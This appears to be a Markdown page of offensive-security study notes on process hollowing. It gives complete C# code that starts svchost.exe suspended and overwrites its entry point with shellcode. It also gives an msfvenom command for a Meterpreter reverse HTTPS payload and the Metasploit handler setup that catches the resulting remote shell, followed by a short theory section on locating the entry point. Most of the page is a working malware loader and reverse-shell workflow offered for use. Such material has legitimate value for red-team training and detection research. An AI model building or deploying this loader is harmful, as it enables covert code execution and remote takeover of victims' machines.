---
title: Process Hollowing
layout: default
parent: Process Injection / Migration / Hollowing
nav_order: 4
---


# Actual Hollowing
[Theory Part](#theory-part)

1. Generate msfvenom with:\
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Visual Studio -> create new "Console App (.NET Framework)". Namespace is the name of project. Full code (change the shellcode):

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[762] {};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```

3\. Change to Release, and x64. Build.

4\. Finally prepare for incoming shell:

```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```

# Theory Part
[Actual Hollowing](#actual-hollowing)

The objective is to create svchost.exe and suspend it using CREATE_SUSPENDED flag when calling CreateProcess. Then we need to locate the EntryPoint of the executable and overwrite its in-memory content with our staged shellcode, resume and let it execute.

To locate EntryPoint:
1. Find the Process Environment Block (PEB) using Win32 ZwQueryInformationProcess API (ProcessBasicInformation class). For eg `0x3004000`.
2. Use ReadProcessMemory to read offset 0x10. For eg read the base address `0x3004000` to obtain the value `0x7ffff01000000`.
3. Use ReadProcessMemory to read first 0x200 bytes (512 bytes) from `0x7ffff01000000`, and manually inspect value of `0x7ffff0100003C` to find PE header. For eg if the value is `0x110 bytes`, PE header is `0x7ffff01000110` (`0x7ffff01000000`+`0x110`).
4. A standard PE file will always have the RVA value at offset `0x28` from the PE header, for eg `0x7ffff01000138` (`0x7ffff01000110` + `0x28`) (https://www.gigacalculator.com/calculators/hexadecimal-calculator.php).
5. Lastly add the value of RVA to the base address value for address of shellcode overwrite (x + 0x7ffff01000000).